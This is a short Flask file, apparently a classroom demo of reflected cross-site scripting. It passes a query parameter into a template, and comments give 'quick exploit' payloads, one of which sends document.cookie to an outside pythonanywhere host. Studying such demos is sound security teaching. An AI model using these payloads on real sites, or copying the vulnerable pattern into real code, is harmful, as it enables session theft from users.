# An example of a 
# To run: flask --app reflected_xss  --debug run
# (The --debug will allow auto reload)

from flask import Flask
from flask import render_template, make_response, request



app = Flask(__name__)

@app.route("/")
def hello_world():

    return render_template("reflected_xss.jinja", name=request.args.get("name"))


# Quick exploit:
# <script>alert("pwned")</script>
# <script>var img = new Image(); img.src="https://jdasilv2.pythonanywhere.com/hacked/"%2Bdocument.cookie; document.body.appendChild(img);</script>



